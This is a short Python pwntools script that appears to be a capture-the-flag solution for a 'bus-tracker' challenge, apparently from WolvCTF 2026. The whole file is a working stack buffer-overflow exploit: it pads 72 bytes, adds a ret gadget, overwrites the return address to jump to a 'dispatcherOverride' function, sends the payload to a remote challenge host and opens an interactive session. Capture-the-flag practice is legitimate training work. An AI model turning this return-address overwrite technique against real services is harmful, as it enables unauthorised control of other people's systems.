from pwn import *

elf = context.binary = ELF('./chal')
# p = process()
p = remote('bus-tracker.wolvctf-2026.kctf.cloud', 1337)

rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]

# payload = flat('A'*72, elf.sym['dispatcherOverride']+5)
payload = flat('A'*72, ret, elf.sym['dispatcherOverride'])

p.sendlineafter('Enter your stop name:', payload)
p.interactive()